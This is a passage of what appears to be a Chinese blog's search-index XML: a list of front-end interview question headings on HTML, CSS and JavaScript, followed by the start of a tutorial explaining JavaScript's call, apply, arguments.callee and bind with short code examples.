在HTML5中，哪个方法用于获得用户的当前位置?</h3><h3 id="1-63-文档的不同注释方式"><a href="#1-63-文档的不同注释方式" class="headerlink" title="1.63 文档的不同注释方式?"></a>1.63 文档的不同注释方式?</h3><h2 id="2-CSS面试题总结"><a href="#2-CSS面试题总结" class="headerlink" title="2.CSS面试题总结"></a>2.CSS面试题总结</h2><h3 id="2-10-display有哪些值？说明他们的作用。"><a href="#2-10-display有哪些值？说明他们的作用。" class="headerlink" title="2.10 display有哪些值？说明他们的作用。"></a>2.10 display有哪些值？说明他们的作用。</h3><h3 id="2-11-position-的值-relative-和-absolute-定位原点是？"><a href="#2-11-position-的值-relative-和-absolute-定位原点是？" class="headerlink" title="2.11 position 的值 relative 和 absolute 定位原点是？"></a>2.11 position 的值 relative 和 absolute 定位原点是？</h3><h3 id="2-12-CSS3有哪些新特性？（根据项目回答）"><a href="#2-12-CSS3有哪些新特性？（根据项目回答）" class="headerlink" title="2.12 CSS3有哪些新特性？（根据项目回答）"></a>2.12 CSS3有哪些新特性？（根据项目回答）</h3><h3 id="2-13-请解释一下CSS3的Flexbox-弹性盒布局模型），以及适用场景？"><a href="#2-13-请解释一下CSS3的Flexbox-弹性盒布局模型），以及适用场景？" class="headerlink" title="2.13 请解释一下CSS3的Flexbox (弹性盒布局模型），以及适用场景？"></a>2.13 请解释一下CSS3的Flexbox (弹性盒布局模型），以及适用场景？</h3><h3 id="2-14-用纯CSS创建一个三角形的原理是什么？"><a href="#2-14-用纯CSS创建一个三角形的原理是什么？" class="headerlink" title="2.14 用纯CSS创建一个三角形的原理是什么？"></a>2.14 用纯CSS创建一个三角形的原理是什么？</h3><h3 id="2-15-—个满屏品字布局如何设计"><a href="#2-15-—个满屏品字布局如何设计" class="headerlink" title="2.15 —个满屏品字布局如何设计?"></a>2.15 —个满屏品字布局如何设计?</h3><h3 id="2-16-CSS多列等高如何实现？"><a href="#2-16-CSS多列等高如何实现？" class="headerlink" title="2.16 CSS多列等高如何实现？"></a>2.16 CSS多列等高如何实现？</h3><h3 id="2-17-经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧"><a href="#2-17-经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧" class="headerlink" title="2.17 经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧?"></a>2.17 经常遇到的浏览器的兼容性有哪些？原因，解决方法是什么，常用hack的技巧?</h3><h3 id="2-18-li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？"><a href="#2-18-li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？" class="headerlink" title="2.18 li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？"></a>2.18 li与li之间有看不见的空白间隔是什么原因引起的？有什么解决办法？</h3><h3 id="2-19-为什么要初始化CSS样式？"><a href="#2-19-为什么要初始化CSS样式？" class="headerlink" title="2.19 为什么要初始化CSS样式？"></a>2.19 为什么要初始化CSS样式？</h3><h3 id="2-20-什么是包含块，对于包含块的理解"><a href="#2-20-什么是包含块，对于包含块的理解" class="headerlink" title="2.20 什么是包含块，对于包含块的理解?"></a>2.20 什么是包含块，对于包含块的理解?</h3><h3 id="2-21-CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别"><a href="#2-21-CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别" class="headerlink" title="2.21 CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别?"></a>2.21 CSS里的visibility属性有个collapse属性值是干嘛用的？在不同浏览器下以后什么区别?</h3><h3 id="2-22-width-auto-和-width-100-的区别"><a href="#2-22-width-auto-和-width-100-的区别" class="headerlink" title="2.22 width:auto 和 width:100%的区别"></a>2.22 width:auto 和 width:100%的区别</h3><h3 id="2-24-简单介绍使用图片base64编码的优点和缺点。"><a href="#2-24-简单介绍使用图片base64编码的优点和缺点。" class="headerlink" title="2.24 简单介绍使用图片base64编码的优点和缺点。"></a>2.24 简单介绍使用图片base64编码的优点和缺点。</h3><h3 id="2-25-‘display’、’position’矛口’float■的相互关系？"><a href="#2-25-‘display’、’position’矛口’float■的相互关系？" class="headerlink" title="2.25 ‘display’、’position’矛口’float■的相互关系？"></a>2.25 ‘display’、’position’矛口’float■的相互关系？</h3><h3 id="2-26-margin重叠问题的理解。"><a href="#2-26-margin重叠问题的理解。" class="headerlink" title="2.26 margin重叠问题的理解。"></a>2.26 margin重叠问题的理解。</h3><h3 id="2-27-对BFC规范（块级格式化上下文：blockformattingcontext-的理解？"><a href="#2-27-对BFC规范（块级格式化上下文：blockformattingcontext-的理解？" class="headerlink" title="2.27 对BFC规范（块级格式化上下文：blockformattingcontext)的理解？"></a>2.27 对BFC规范（块级格式化上下文：blockformattingcontext)的理解？</h3><h3 id="2-28-IFC-是什么？"><a href="#2-28-IFC-是什么？" class="headerlink" title="2.28 IFC 是什么？"></a>2.28 IFC 是什么？</h3><h3 id="2-29-请解释一下为什么需要淸除浮动？清除浮动的方式"><a href="#2-29-请解释一下为什么需要淸除浮动？清除浮动的方式" class="headerlink" title="2.29 请解释一下为什么需要淸除浮动？清除浮动的方式"></a>2.29 请解释一下为什么需要淸除浮动？清除浮动的方式</h3><h3 id="2-30-使用dear属性清除浮动的原理？"><a href="#2-30-使用dear属性清除浮动的原理？" class="headerlink" title="2.30 使用dear属性清除浮动的原理？"></a>2.30 使用dear属性清除浮动的原理？</h3><h3 id="2-31-zoom-1的清除浮动原理"><a href="#2-31-zoom-1的清除浮动原理" class="headerlink" title="2.31 zoom:1的清除浮动原理?"></a>2.31 zoom:1的清除浮动原理?</h3><h3 id="2-32-移动端的布局用过媒体査询吗？"><a href="#2-32-移动端的布局用过媒体査询吗？" class="headerlink" title="2.32 移动端的布局用过媒体査询吗？"></a>2.32 移动端的布局用过媒体査询吗？</h3><h3 id="2-33-使用CSS预处理器吗？喜欢哪个"><a href="#2-33-使用CSS预处理器吗？喜欢哪个" class="headerlink" title="2.33 使用CSS预处理器吗？喜欢哪个?"></a>2.33 使用CSS预处理器吗？喜欢哪个?</h3><h3 id="2-34-CSS优化、提高性能的方法有哪些？"><a href="#2-34-CSS优化、提高性能的方法有哪些？" class="headerlink" title="2.34 CSS优化、提高性能的方法有哪些？"></a>2.34 CSS优化、提高性能的方法有哪些？</h3><h3 id="2-35-浏览器是怎样解析CSS选择器的？"><a href="#2-35-浏览器是怎样解析CSS选择器的？" class="headerlink" title="2.35 浏览器是怎样解析CSS选择器的？"></a>2.35 浏览器是怎样解析CSS选择器的？</h3><h3 id="2-36-在网页中应该使用奇数还是偶数的字体？为什么呢？"><a href="#2-36-在网页中应该使用奇数还是偶数的字体？为什么呢？" class="headerlink" title="2.36 在网页中应该使用奇数还是偶数的字体？为什么呢？"></a>2.36 在网页中应该使用奇数还是偶数的字体？为什么呢？</h3><h3 id="2-37-margin和padding分别适合什么场景使用？"><a href="#2-37-margin和padding分别适合什么场景使用？" class="headerlink" title="2.37 margin和padding分别适合什么场景使用？"></a>2.37 margin和padding分别适合什么场景使用？</h3><h3 id="2-38-抽离样式模块怎么写，说出思路，有无实践经验？丨阿里航旅的面试题"><a href="#2-38-抽离样式模块怎么写，说出思路，有无实践经验？丨阿里航旅的面试题" class="headerlink" title="2.38 抽离样式模块怎么写，说出思路，有无实践经验？丨阿里航旅的面试题]"></a>2.38 抽离样式模块怎么写，说出思路，有无实践经验？丨阿里航旅的面试题]</h3><h3 id="2-39-简单说一下css3的all属性。"><a href="#2-39-简单说一下css3的all属性。" class="headerlink" title="2.39 简单说一下css3的all属性。"></a>2.39 简单说一下css3的all属性。</h3><h3 id="2-40-为什么不建议使用统配符初始化css样式。"><a href="#2-40-为什么不建议使用统配符初始化css样式。" class="headerlink" title="2.40 为什么不建议使用统配符初始化css样式。"></a>2.40 为什么不建议使用统配符初始化css样式。</h3><h3 id="2-41-absolute的containingblock-包含块）计算方式跟正常流有什么不同？"><a href="#2-41-absolute的containingblock-包含块）计算方式跟正常流有什么不同？" class="headerlink" title="2.41 absolute的containingblock (包含块）计算方式跟正常流有什么不同？"></a>2.41 absolute的containingblock (包含块）计算方式跟正常流有什么不同？</h3><h3 id="2-51-设备像素、CSS像素、设备独立像素、DPR、PPI、DPI之间的区别？"><a href="#2-51-设备像素、CSS像素、设备独立像素、DPR、PPI、DPI之间的区别？" class="headerlink" title="2.51 设备像素、CSS像素、设备独立像素、DPR、PPI、DPI之间的区别？"></a>2.51 设备像素、CSS像素、设备独立像素、DPR、PPI、DPI之间的区别？</h3><h3 id="2-52-layoutviewport、visualviewport-和-idealviewport-的区别"><a href="#2-52-layoutviewport、visualviewport-和-idealviewport-的区别" class="headerlink" title="2.52 layoutviewport、visualviewport 和 idealviewport 的区别?"></a>2.52 layoutviewport、visualviewport 和 idealviewport 的区别?</h3><h3 id="2-53-position-fixed-在-android-下无效怎么处理？"><a href="#2-53-position-fixed-在-android-下无效怎么处理？" class="headerlink" title="2.53 position:fixed;在 android 下无效怎么处理？"></a>2.53 position:fixed;在 android 下无效怎么处理？</h3><h3 id="2-54-如果箱要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）"><a href="#2-54-如果箱要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）" class="headerlink" title="2.54 如果箱要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）"></a>2.54 如果箱要手动写动画，你认为最小时间间隔是多久，为什么？（阿里）</h3><h3 id="2-55-如何让去除inline-block元素间间距？"><a href="#2-55-如何让去除inline-block元素间间距？" class="headerlink" title="2.55 如何让去除inline-block元素间间距？"></a>2.55 如何让去除inline-block元素间间距？</h3><h3 id="2-56-overflow-scroll时不能平滑滚动的问题怎么处理？"><a href="#2-56-overflow-scroll时不能平滑滚动的问题怎么处理？" class="headerlink" title="2.56 overflow:scroll时不能平滑滚动的问题怎么处理？"></a>2.56 overflow:scroll时不能平滑滚动的问题怎么处理？</h3><h3 id="2-57-有一个高度自适应的div，里面有两个div-—个高度100px，希望另一个填满剩下的"><a href="#2-57-有一个高度自适应的div，里面有两个div-—个高度100px，希望另一个填满剩下的" class="headerlink" title="2.57 有一个高度自适应的div，里面有两个div, —个高度100px，希望另一个填满剩下的"></a>2.57 有一个高度自适应的div，里面有两个div, —个高度100px，希望另一个填满剩下的</h3><h3 id="2-58-png、jpg、gif这些图片格式解释一下，分别什么时候用。有没有了解过webp"><a href="#2-58-png、jpg、gif这些图片格式解释一下，分别什么时候用。有没有了解过webp" class="headerlink" title="2.58 png、jpg、gif这些图片格式解释一下，分别什么时候用。有没有了解过webp?"></a>2.58 png、jpg、gif这些图片格式解释一下，分别什么时候用。有没有了解过webp?</h3><h3 id="2-59-浏览器如何判断是否支持webp格式图片"><a href="#2-59-浏览器如何判断是否支持webp格式图片" class="headerlink" title="2.59 浏览器如何判断是否支持webp格式图片"></a>2.59 浏览器如何判断是否支持webp格式图片</h3><h3 id="2-60-什么是Cookie隔离？（或者说：请求资源的时候不要让它带cookie怎么做）"><a href="#2-60-什么是Cookie隔离？（或者说：请求资源的时候不要让它带cookie怎么做）" class="headerlink" title="2.60 什么是Cookie隔离？（或者说：请求资源的时候不要让它带cookie怎么做）"></a>2.60 什么是Cookie隔离？（或者说：请求资源的时候不要让它带cookie怎么做）</h3><h3 id="2-61-style标签写在body后与body前有什么区别？"><a href="#2-61-style标签写在body后与body前有什么区别？" class="headerlink" title="2.61 style标签写在body后与body前有什么区别？"></a>2.61 style标签写在body后与body前有什么区别？</h3><h3 id="2-62-什么是CSS预处理器-后处理器？"><a href="#2-62-什么是CSS预处理器-后处理器？" class="headerlink" title="2.62 什么是CSS预处理器/后处理器？"></a>2.62 什么是CSS预处理器/后处理器？</h3><h3 id="2-63-阐述一下-CSSSprites"><a href="#2-63-阐述一下-CSSSprites" class="headerlink" title="2.63 阐述一下 CSSSprites"></a>2.63 阐述一下 CSSSprites</h3><h3 id="2-64-使用rem布局的优缺点？"><a href="#2-64-使用rem布局的优缺点？" class="headerlink" title="2.64 使用rem布局的优缺点？"></a>2.64 使用rem布局的优缺点？</h3><h3 id="2-65-几种常见的CSS布局"><a href="#2-65-几种常见的CSS布局" class="headerlink" title="2.65 几种常见的CSS布局"></a>2.65 几种常见的CSS布局</h3><h3 id="2-66-画一条0-5px的线"><a href="#2-66-画一条0-5px的线" class="headerlink" title="2.66 画一条0.5px的线"></a>2.66 画一条0.5px的线</h3><h3 id="2-67-transition-和-animation-的区别"><a href="#2-67-transition-和-animation-的区别" class="headerlink" title="2.67 transition 和 animation 的区别"></a>2.67 transition 和 animation 的区别</h3><h3 id="2-68-什么是首选最小宽度？"><a href="#2-68-什么是首选最小宽度？" class="headerlink" title="2.68 什么是首选最小宽度？"></a>2.68 什么是首选最小宽度？</h3><h3 id="2-69-为什么-height-lOO-会无效？"><a href="#2-69-为什么-height-lOO-会无效？" class="headerlink" title="2.69 为什么 height: lOO%会无效？"></a>2.69 为什么 height: lOO%会无效？</h3><h3 id="2-70-min-width-max-width-和-min-height-max-height-厲性间的覆盖规则"><a href="#2-70-min-width-max-width-和-min-height-max-height-厲性间的覆盖规则" class="headerlink" title="2.70 min-width/max-width 和 min-height/max-height 厲性间的覆盖规则?"></a>2.70 min-width/max-width 和 min-height/max-height 厲性间的覆盖规则?</h3><h3 id="2-71-内联盒模型基本概念"><a href="#2-71-内联盒模型基本概念" class="headerlink" title="2.71 内联盒模型基本概念"></a>2.71 内联盒模型基本概念</h3><h3 id="2-72-什么是幽灵空白节点？"><a href="#2-72-什么是幽灵空白节点？" class="headerlink" title="2.72 什么是幽灵空白节点？"></a>2.72 什么是幽灵空白节点？</h3><h3 id="2-73-什么是替换元素？"><a href="#2-73-什么是替换元素？" class="headerlink" title="2.73 什么是替换元素？"></a>2.73 什么是替换元素？</h3><h3 id="2-74-替换元素的计算规则？"><a href="#2-74-替换元素的计算规则？" class="headerlink" title="2.74 替换元素的计算规则？"></a>2.74 替换元素的计算规则？</h3><h3 id="2-75-content与替换元素的关系？"><a href="#2-75-content与替换元素的关系？" class="headerlink" title="2.75 content与替换元素的关系？"></a>2.75 content与替换元素的关系？</h3><h3 id="2-76-margin-auto-的填充规则？"><a href="#2-76-margin-auto-的填充规则？" class="headerlink" title="2.76 margin:auto 的填充规则？"></a>2.76 margin:auto 的填充规则？</h3><h3 id="2-77-margin无效的情形"><a href="#2-77-margin无效的情形" class="headerlink" title="2.77 margin无效的情形"></a>2.77 margin无效的情形</h3><h3 id="2-78-border-的特殊性？"><a href="#2-78-border-的特殊性？" class="headerlink" title="2.78 border 的特殊性？"></a>2.78 border 的特殊性？</h3><h2 id="3-JavaScript面试知识点总结"><a href="#3-JavaScript面试知识点总结" class="headerlink" title="3 JavaScript面试知识点总结"></a>3 JavaScript面试知识点总结</h2><h3 id="3-1-介绍js的基本数据类型。"><a href="#3-1-介绍js的基本数据类型。" class="headerlink" title="3.1 介绍js的基本数据类型。"></a>3.1 介绍js的基本数据类型。</h3><h3 id="3-2-JavaScript有几种类型的值？你能画一下他们的内存图吗？"><a href="#3-2-JavaScript有几种类型的值？你能画一下他们的内存图吗？" class="headerlink" title="3.2 JavaScript有几种类型的值？你能画一下他们的内存图吗？"></a>3.2 JavaScript有几种类型的值？你能画一下他们的内存图吗？</h3><h3 id="3-3-什么是堆？什么是栈？它们之间有什么区别和联系？"><a href="#3-3-什么是堆？什么是栈？它们之间有什么区别和联系？" class="headerlink" title="3.3 什么是堆？什么是栈？它们之间有什么区别和联系？"></a>3.3 什么是堆？什么是栈？它们之间有什么区别和联系？</h3><h3 id="3-4-内部属性-Class-是什么？"><a href="#3-4-内部属性-Class-是什么？" class="headerlink" title="3.4 内部属性[[Class]]是什么？"></a>3.4 内部属性[[Class]]是什么？</h3><h3 id="3-5-介绍js有哪些内置对象？"><a href="#3-5-介绍js有哪些内置对象？" class="headerlink" title="3.5 介绍js有哪些内置对象？"></a>3.5 介绍js有哪些内置对象？</h3><h3 id="3-6-undefined-与-undeclared-的区别"><a href="#3-6-undefined-与-undeclared-的区别" class="headerlink" title="3.6 undefined 与 undeclared 的区别?"></a>3.6 undefined 与 undeclared 的区别?</h3><h3 id="3-7-null-和-undefined-的区别"><a href="#3-7-null-和-undefined-的区别" class="headerlink" title="3.7 null 和 undefined 的区别?"></a>3.7 null 和 undefined 的区别?</h3><h3 id="3-8-如何获取安全的undefined值？"><a href="#3-8-如何获取安全的undefined值？" class="headerlink" title="3.8 如何获取安全的undefined值？"></a>3.8 如何获取安全的undefined值？</h3><h3 id="3-9-说几条写JavaScript的基本规范？"><a href="#3-9-说几条写JavaScript的基本规范？" class="headerlink" title="3.9 说几条写JavaScript的基本规范？"></a>3.9 说几条写JavaScript的基本规范？</h3><p> -在平常项目开发中，我们遵守一些这样的基本规范，比如说： </p>
<h3 id="3-10-JavaScript原型，原型链？有什么特点？"><a href="#3-10-JavaScript原型，原型链？有什么特点？" class="headerlink" title="3.10 JavaScript原型，原型链？有什么特点？"></a>3.10 JavaScript原型，原型链？有什么特点？</h3><h3 id="3-11-js获取原型的方法？"><a href="#3-11-js获取原型的方法？" class="headerlink" title="3.11 js获取原型的方法？"></a>3.11 js获取原型的方法？</h3><h3 id="3-12-在js中不同进制数字的表示方式"><a href="#3-12-在js中不同进制数字的表示方式" class="headerlink" title="3.12 在js中不同进制数字的表示方式"></a>3.12 在js中不同进制数字的表示方式</h3><h3 id="3-13-js中整数的安全范围是多少？"><a href="#3-13-js中整数的安全范围是多少？" class="headerlink" title="3.13 js中整数的安全范围是多少？"></a>3.13 js中整数的安全范围是多少？</h3><h3 id="3-14-typeof-NaN的结果是什么？"><a href="#3-14-typeof-NaN的结果是什么？" class="headerlink" title="3.14 typeof NaN的结果是什么？"></a>3.14 typeof NaN的结果是什么？</h3><h3 id="3-15-isNaN-和-Number-isNaN-函数的区别？"><a href="#3-15-isNaN-和-Number-isNaN-函数的区别？" class="headerlink" title="3.15 isNaN 和 Number.isNaN 函数的区别？"></a>3.15 isNaN 和 Number.isNaN 函数的区别？</h3><h3 id="3-16-Array构造函数只有一个参数值吋的表现？"><a href="#3-16-Array构造函数只有一个参数值吋的表现？" class="headerlink" title="3.16 Array构造函数只有一个参数值吋的表现？"></a>3.16 Array构造函数只有一个参数值吋的表现？</h3><h3 id="3-17-其他值到字符串的转换规则？"><a href="#3-17-其他值到字符串的转换规则？" class="headerlink" title="3.17 其他值到字符串的转换规则？"></a>3.17 其他值到字符串的转换规则？</h3><h3 id="3-18-其他值到数字值的转换规则？"><a href="#3-18-其他值到数字值的转换规则？" class="headerlink" title="3.18 其他值到数字值的转换规则？"></a>3.18 其他值到数字值的转换规则？</h3><h3 id="3-19-其他值到布尔类型的值的转换规则？"><a href="#3-19-其他值到布尔类型的值的转换规则？" class="headerlink" title="3.19 其他值到布尔类型的值的转换规则？"></a>3.19 其他值到布尔类型的值的转换规则？</h3><h3 id="3-20-和-的-valueOf-和-toString-的结果是什么？"><a href="#3-20-和-的-valueOf-和-toString-的结果是什么？" class="headerlink" title="3.20 { } 和 [ ] 的  valueOf 和 toString 的结果是什么？"></a>3.20 { } 和 [ ] 的  valueOf 和 toString 的结果是什么？</h3><h3 id="3-21-什么是假值对象？"><a href="#3-21-什么是假值对象？" class="headerlink" title="3.21 什么是假值对象？"></a>3.21 什么是假值对象？</h3><h3 id="3-22-操作符的作用？"><a href="#3-22-操作符的作用？" class="headerlink" title="3.22 ~操作符的作用？"></a>3.22 ~操作符的作用？</h3><h3 id="3-23-解析字符串中的数字和将字符串强制类型转换为数字的返回结果都是数字，它们之间的区别是什么？"><a href="#3-23-解析字符串中的数字和将字符串强制类型转换为数字的返回结果都是数字，它们之间的区别是什么？" class="headerlink" title="3.23 解析字符串中的数字和将字符串强制类型转换为数字的返回结果都是数字，它们之间的区别是什么？"></a>3.23 解析字符串中的数字和将字符串强制类型转换为数字的返回结果都是数字，它们之间的区别是什么？</h3><h3 id="3-24-操作符什么时候用于字符串的拼接？"><a href="#3-24-操作符什么时候用于字符串的拼接？" class="headerlink" title="3.24 +操作符什么时候用于字符串的拼接？"></a>3.24 +操作符什么时候用于字符串的拼接？</h3><h3 id="3-25-什么情况下会发生布尔值的隐式强制类型转换？"><a href="#3-25-什么情况下会发生布尔值的隐式强制类型转换？" class="headerlink" title="3.25 什么情况下会发生布尔值的隐式强制类型转换？"></a>3.25 什么情况下会发生布尔值的隐式强制类型转换？</h3><h3 id="3-26-和-amp-amp-操作符的返回值？"><a href="#3-26-和-amp-amp-操作符的返回值？" class="headerlink" title="3.26 ||和&amp;&amp;操作符的返回值？"></a>3.26 ||和&amp;&amp;操作符的返回值？</h3>]]></content>
      <categories>
        <category>综合</category>
      </categories>
      <tags>
        <tag>基础知识</tag>
        <tag>基础题</tag>
      </tags>
  </entry>
  <entry>
    <title>综合-函数式编程</title>
    <url>/2018/04/17/%E7%BB%BC%E5%90%88_%E5%87%BD%E6%95%B0%E5%BC%8F%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h3 id="一：理解call和apply-及arguments-callee"><a href="#一：理解call和apply-及arguments-callee" class="headerlink" title="一：理解call和apply 及arguments.callee"></a>一：理解call和apply 及arguments.callee</h3><p>ECMAScript3给Function的原型定义了两个方法，他们是<code>Function.prototype.call</code> 和 <code>Function.prototype.apply</code>. 其实他们的作用是一样的，只是传递的参数不一样而已；</p>
<ol>
<li><code>apply</code>; 接受2个参数，第一个参数指定了函数体内<code>this</code>对象的指向，第二个参数为一个类似数组的集合，比如如下代码：</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log([a,b]); <span class="comment">// [1,2]</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.apply(<span class="literal">null</span>,[<span class="number">1</span>,<span class="number">2</span>]);</span><br></pre></td></tr></table></figure>
<p>如上代码，我们第一个参数传入<code>null</code>，函数体内默认会指向与宿主对象，即<code>window</code>对象；因此我们可以在yunxi函数内打印下值为true即可看到：</p>
<p>下面我们来看看使用<code>call</code>方法的实例如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> yunxi = <span class="function"><span class="keyword">function</span>(<span class="params">a,b</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log([a,b]); <span class="comment">// [1,2]</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in">console</span>.log(<span class="keyword">this</span> === <span class="built_in">window</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">yunxi.call(<span class="literal">null</span>,<span class="number">1</span>,<span class="number">2</span>);</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>call</code>方法的第二个参数是以逗号隔开的参数；</p>
<p>那么<code>call</code>和<code>apply</code>用在什么地方呢？</p>
<ol>
<li><code>call</code>和<code>apply</code> 最常见的用途是改变函数体内的<code>this</code>指向，如下代码:</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> longen = &#123;</span><br><span class="line">    name:<span class="string">'yunxi'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> longen2 = &#123;</span><br><span class="line">    name: <span class="string">'我叫涂根华'</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> name = <span class="string">"我是来测试的"</span>;</span><br><span class="line"><span class="keyword">var</span> getName = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="built_in">console</span>.log(getName()); <span class="comment">// 打印 "我是来测试的";</span></span><br><span class="line"><span class="built_in">console</span>.log(getName.call(longen)); <span class="comment">// 打印 yunxi</span></span><br><span class="line"><span class="built_in">console</span>.log(getName.call(longen2)); <span class="comment">// 打印 "我叫涂根华"</span></span><br></pre></td></tr></table></figure>
<p>第一次调用 <code>getName()</code>方法，因为它是普通函数调用，所以它的this指向与window，因此打印出全局对象的<code>name</code>的值；</p>
<p>第二次调用<code>getName.call(longen)</code>; 执行这句代码后，getName这个方法的内部指针this指向于<code>longen</code>这个对象了，因此打印<code>this.name</code>实际上是<code>longen.name</code>，因此返回的是<code>name=”yunxi”</code>;</p>
<p>但是<code>this</code>指针也有列外的情况，比如一个点击元素，当我们点击一个元素的时候，<code>this</code>指针就指向与那个点击元素，但是当我们在内部再包含一个函数后，在函数内再继续调用<code>this</code>的话，那么现在的<code>this</code>指针就指向了<code>window</code>了；比如如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 打印出window对象</span></span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码。可以看到外部<code>this</code>指向与被点击的那个元素，内部普通函数调用，<code>this</code>指针都是指向于window对象。但是我们可以使用<code>call</code>或者<code>apply</code>方法来改变<code>this</code>的指针的；如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// 就指向于div元素对象了</span></span><br><span class="line">    &#125;</span><br><span class="line">    func.call(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如上代码我们使用<code>call</code>方法调用func函数，使<code>this</code>指向与<code>func</code>这个对象了，当然上面的方法我们还可以不使用<code>call</code>或者<code>apply</code>方法来改变<code>this</code>的指针，我们可以在外部先使用一个变量来保存<code>this</code>的指针，在内部调用的时候我们可以使用哪个变量即可，如下代码演示：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"longen"</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>); <span class="comment">// this 就指向于div元素对象了</span></span><br><span class="line">    <span class="keyword">var</span> self = <span class="keyword">this</span>;</span><br><span class="line">    <span class="keyword">var</span> func = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(self); <span class="comment">// 就指向于div元素对象了</span></span><br><span class="line">    &#125;</span><br><span class="line">    func();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="arguments-callee的理解"><a href="#arguments-callee的理解" class="headerlink" title="arguments.callee的理解"></a>arguments.callee的理解</h4><p><code>callee</code>是<code>arguments</code>的一个属性，它可以被用作当前函数或函数体执行的环境中，或者说调用一个匿名函数；返回的是当前正在被执行的Function对象；简单的来说就是当前执行环境的函数被调用时候，<code>arguments.callee</code>对象会指向与自身，就是当前的那个函数的引用；</p>
<p>如下代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> count = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">var</span> test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(count + <span class="string">" -- "</span> + (test.length == <span class="built_in">arguments</span>.callee.length) );</span><br><span class="line">    <span class="comment">// 打印出 1 -- true 2 -- true  3 -- true</span></span><br><span class="line">    <span class="keyword">if</span> (count++ &lt; <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// 调用test()函数自身</span></span><br><span class="line">        <span class="built_in">arguments</span>.callee();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">test();</span><br></pre></td></tr></table></figure>
<p><code>arguments.callee()</code>的含义是调用当前正在执行的函数自身，比如上面的test的匿名函数；</p>
<h4 id="Function-prototype-bind介绍"><a href="#Function-prototype-bind介绍" class="headerlink" title="Function.prototype.bind介绍"></a>Function.prototype.bind介绍</h4><p>目前很多高级浏览器都支持<code>Function.prototype.bind</code>方法，该方法用来指定函数内部的<code>this</code>指向。为了支持各个浏览器，我们也可以自己来简单的模拟一个~</p>
<p>如下代码：</p>
